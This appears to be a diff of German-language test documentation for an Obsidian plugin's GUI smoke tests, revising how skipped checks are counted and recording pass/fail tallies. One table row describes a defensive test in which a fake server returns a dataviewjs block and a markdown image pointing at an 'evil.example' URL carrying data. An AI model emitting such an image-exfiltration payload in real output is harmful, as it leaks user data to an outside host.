@@ -6,7 +6,7 @@ nicht von Hand. Treiber: `scripts/gui-smoke.ts`, Fixture: `fixtures/vault/`, CDP
 
 Der Lauf misst zwei Hälften: **A/B ohne Modell** (Panel, Quellen, Guards) und **C mit
 Modell** (Stream, Statusanzeige, Ausgänge, Logbuch). Antwortet auf `http://127.0.0.1:1234`
-kein Endpunkt, wird C **übersprungen und benannt** — nie still grün (CORE-TEST-19).
+kein Endpunkt oder ist kein Modell gewählt, steht C als **nichts gemessen** da (Exit 1) — nie still grün (CORE-TEST-19). Die Bilanz hat vier Zustände (grün · rot · übersprungen · nichts gemessen), die Soll-Liste (53 Punkte) ist der Nenner; „übersprungen“ ist nur, was in dieser Lage nicht anwendbar ist (`prefers-reduced-motion`, die per Hand abgedeckte Markierung). `--port` ist Pflicht.
 
 ## Rezept: Zweitinstanz, eigenes Profil, eigener Port
 
@@ -123,6 +123,8 @@ Rollbereich geworden; C9/C9b tragen seitdem eine andere Frage, C11/C11b/C9c sind
 | V2 | Schlüssel steht nicht mehr in `data.json`, der Server bekommt ihn trotzdem | Endpunkt **mit** Klartext-Schlüssel setzen, `llm.resolve({ force: true })`, dann `data.json` lesen: kein Schlüssel, `secretId` da; am Server `Authorization: Bearer <Schlüssel>` | grün | 2026-10-09 |
 | V3 | Antwort mit Code-Block-Prozessor und Bild rendert als Text | Panel-Lauf, der Server antwortet mit einem ```` ```dataviewjs ````-Block und `![x](https://evil.example/?d=…)`: im `.okit-stream-body` kein `img`, kein `pre`, der Text zeigt „dataviewjs“ | grün | 2026-10-09 |
 
+**Bilanz des letzten Laufs (Welle 19, 2026-10-12, Treiber-Umbau auf `bilanz.ts`, Kit 0.57.0): ohne Modell 35 grün · 0 rot · 1 übersprungen · 17 nichts gemessen — von 53 Prüfpunkten** (alter Treiber, gleiche Lage: 35 grün · 0 rot · 18 übersprungen von 53; 17 der 18 waren „kein Modell gewählt“ und sind jetzt „nichts gemessen“). Mit `--model qwen/qwen3.6-27b`: **50 grün · 1 rot · 1 übersprungen · 1 nichts gemessen**. Rot ist C11b (nach künstlichem `scrollTop = 0` steht das Panel bei 54–73 px statt < 40), **vorher schon rot**: gleicher Befund mit dem Build von Tag 0.9.0 und dem alten Treiber, also nicht durch den Umbau entstanden; in Welle 15 (2026-10-09, Kit 0.51.2) war C11b grün, Ursache offen. C8 ist nichts gemessen (das Modell liefert ohne Denken keinen `reasoning_content`).
+
 **Bilanz des letzten Laufs (Welle 15, 2026-10-09, nach dem Verbindungs-Tausch auf Kit 0.51.2): 49 grün · 0 rot · 2 übersprungen — von 51 Prüfpunkten** (Baseline davor: 46 grün · 0 rot · 2 übersprungen — von 48; dazu V1–V3). Übersprungen: C8 (das gewählte Modell liefert bei ausgeschaltetem Denken keinen Gedankenstrom) und „Markierung ersetzen“ (Handarbeit).
 
 (Stand der Tabelle davor: 29 grün · 0 rot · 1 übersprungen — von 30 Prüfpunkten.)
@@ -217,8 +219,8 @@ steht hier, weil die Lehre allgemein ist: mit Denken überschritt derselbe Lauf 
 120-s-Grenze von `laufeTune`, und C3/C4 klickten danach auf Knöpfe, die während eines
 laufenden Streams gesperrt sind — **zwei rote und ein übersprungener Punkt als Preis einer
 eingesparten Minute.** Liefert das gewählte Modell gar keinen Gedankenstrom, wird C8
-**übersprungen mit genau diesem Grund**, nicht rot: das ist eine Modelleigenschaft, kein
-Plugin-Defekt.
+**nichts gemessen mit genau diesem Grund**, nicht rot: das ist eine Modelleigenschaft, kein
+Plugin-Defekt (seit Welle 19 zählt das als „nichts gemessen“ und setzt Exit 1; ein Modell mit Denkstrom macht ihn grün).
 
 ### B11, C9b und C10 — die Punkte aus der Review vom 2026-09-08
 
@@ -278,7 +280,7 @@ nicht rot (gemessen am 2026-09-07: reduce war aus).
 Der Punkt, den der Treiber bis dahin nicht hatte: `readLabApi` gab bei einer Versionsabweichung **still** `null` zurück, und `llm-lab` (apiVersion 4) bekam von LingoTuner (Client prüfte 3) nichts — ohne Fehler, ohne rotes Zeichen. Gemessen wird deshalb die **Wirkung** gegen das **echte** `llm-lab` (kein Stub, dessen Version mit dem Client altern könnte): eine neue Zeile mit `plugin: "lingotuner"` in `.obsidian/plugins/llm-lab/traces/*.jsonl`, mit gesetzter `turnId`.
 
 - `npm run smoke:gui -- --setup` deployt `../llm-lab` (`main.js`, `manifest.json`, `styles.css`; vorher dort bauen) in den Staging-Vault und trägt es in `community-plugins.json` ein. Die Zweitinstanz danach **neu starten** (Plugin-Code wird nur beim Start geladen).
-- Ohne geladenes `llm-lab` steht der Punkt **übersprungen** mit Grund da — nie still grün.
+- Ohne geladenes `llm-lab` steht der Punkt als **nichts gemessen** mit Grund da — nie still grün.
 - Der Lauf geht gegen den Fake-Manager-Endpunkt (wie M2), braucht also kein Modell in LM Studio.
 - Gegenprobe (2026-09-25): mit dem Client-Stand von 0.3.1 (`SUPPORTED_API_VERSION = 3`) ist L1 rot (`Zeilen von lingotuner 0 → 0`), mit 4 grün (`4 → 5`, `turnId` gesetzt).
 
